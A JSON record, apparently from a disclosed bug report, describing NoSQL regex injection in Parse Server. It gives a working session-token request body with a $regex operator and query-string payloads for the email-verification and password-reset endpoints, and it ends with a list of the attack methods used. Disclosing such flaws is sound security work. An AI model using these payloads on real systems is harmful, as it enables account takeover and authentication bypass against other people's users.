{"description": "1. you can fetch all the users' objects, by using regex in the NoSQL query.\nUsing the NoSQL, you can use a regex on sessionToken `(\"_SessionToken\":{\"$regex\":\"r:027f\"}}` and find valid accounts this way.\n\nUsing this method, it's possible to retrieve accounts without interaction from the users.\n\nGET /parse/users/me HTTP/1.1\n```\n{\n  \"_ApplicationId\": \"appName\",\n  \"_JavaScriptKey\": \"javascriptkey\",\n  \"_ClientVersion\": \"js2.10.0\",\n  \"_InstallationId\": \"ca713ee2-6e60-d023-a8fe-14e1bfb2f300\",\n  \"_SessionToken\": {\n    \"$regex\": \"r:5\"\n  }\n}\n```\nWhen trying it with an update query the same thing luckily doesn't seem to work:\nPOST /parse/classes/_User/PPNk59jPPZ\n\n2. There is another similar vulnerability in verify email and the request password reset.\n\nIf you sign up with someone else's email address, you can simply use regex in the token param to verify the account: `http://localhost:1337/parse/apps/kickbox/verify_email?token[$regex]=a&username=some@email.com`\n\nThe same thing can be done for reset password: `http://localhost:1337/parse/apps/kickbox/request_password_reset?token[$regex]=a&username=some@email.com`\n\nYou may need to do it a few times with a different letter/number, but as long as the tokens contain the character it will succeed.", "methods": ["Used NoSQL query with regex to fetch all users' objects.", "Used regex in query to retrieve valid accounts without user interaction.", "Used regex in query to verify email and reset password for arbitrary accounts.", "Used regex in query to bypass authentication."]}